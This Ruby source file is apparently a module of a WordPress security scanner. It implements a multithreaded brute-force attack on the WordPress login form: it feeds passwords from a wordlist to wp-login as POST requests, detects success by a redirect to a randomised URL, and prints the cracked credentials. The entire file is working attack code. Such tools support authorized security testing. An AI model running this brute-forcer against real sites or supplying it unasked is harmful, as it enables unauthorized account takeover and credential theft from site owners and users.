# encoding: UTF-8

class WpUser < WpItem
  module BruteForcable

    # Brute force the user with the wordlist supplied
    #
    # It can take a long time to queue 2 million requests,
    # for that reason, we queue browser.max_threads, send browser.max_threads,
    # queue browser.max_threads and so on.
    #
    # hydra.run only returns when it has recieved all of its, responses.
    # This means that while we are waiting for browser.max_threads,
    # responses, we are waiting...
    #
    # @param [ String ] wordlist The wordlist path
    # @param [ Hash ] options
    # @option options [ Boolean ] :verbose
    # @option options [ Boolean ] :show_progression
    # @param [ String ] redirect_url Override for redirect_url
    #
    # @return [ void ]
    def brute_force(wordlist, options = {}, redirect_url = nil)
      browser      = Browser.instance
      hydra        = browser.hydra
      queue_count  = 0
      found        = false
      progress_bar = self.progress_bar(count_file_lines(wordlist), options)

      File.open(wordlist).each do |password|
        password.chop!

        # A successfull login will redirect us to the redirect_to parameter
        # Generate a random one on each request
        unless redirect_url
          random = (0...8).map { 65.+(rand(26)).chr }.join
          redirect_url = "#@uri#{random}/"
        end

        request = login_request(password, redirect_url)

        request.on_complete do |response|
          progress_bar.progress += 1 if options[:show_progression] && !found

          puts "\n  Trying Username : #{login} Password : #{password}" if options[:verbose]

          if valid_password?(response, password, redirect_url, options)
            found         = true
            self.password = password
            return
          end
        end

        hydra.queue(request)
        queue_count += 1

        if queue_count >= browser.max_threads
          hydra.run
          queue_count = 0
          puts "Sent #{browser.max_threads} requests ..." if options[:verbose]
        end
      end

      # run all of the remaining requests
      hydra.run
    end

    # @param [ Integer ] targets_size
    # @param [ Hash ] options
    #
    # @return [ ProgressBar ]
    # :nocov:
    def progress_bar(passwords_size, options)
      if options[:show_progression]
        ProgressBar.create(
          format: '%t %a <%B> (%c / %C) %P%% %e',
          title: "  Brute Forcing '#{login}'",
          total: passwords_size
        )
      end
    end
    # :nocov:

    # @param [ String ] password
    # @param [ String ] redirect_url
    #
    # @return [ Typhoeus::Request ]
    def login_request(password, redirect_url)
      Browser.instance.forge_request(login_url,
        method: :post,
        body: { log: login, pwd: password, redirect_to: redirect_url },
        cache_ttl: 0
      )
    end

    # @param [ Typhoeus::Response ] response
    # @param [ String ] password
    # @param [ String ] redirect_url
    # @param [ Hash ] options
    # @option options [ Boolean ] :verbose
    # @option options [ Boolean ] :show_progression
    #
    # @return [ Boolean ]
    def valid_password?(response, password, redirect_url, options = {})
      if response.code == 302 && response.headers_hash && response.headers_hash['Location'] == redirect_url
        progression = "#{info('[SUCCESS]')} Login : #{login} Password : #{password}\n\n"
        valid       = true
      elsif response.body =~ /login_error/i
        verbose = "\n  Incorrect login and/or password."
      elsif response.timed_out?
        progression = "#{critical('ERROR:')} Request timed out."
      elsif response.code == 0
        progression = "#{critical('ERROR:')} No response from remote server. WAF/IPS?"
      elsif response.code.to_s =~ /^50/
        progression = "#{critical('ERROR:')} Server error, try reducing the number of threads."
      else
        progression = "#{critical('ERROR:')} We received an unknown response for #{password}..."
        verbose     = critical("    Code: #{response.code}\n    Body: #{response.body}\n")
      end

      puts "\n  " + progression if progression && options[:show_progression]
      puts verbose if verbose && options[:verbose]

      valid || false
    end

  end
end
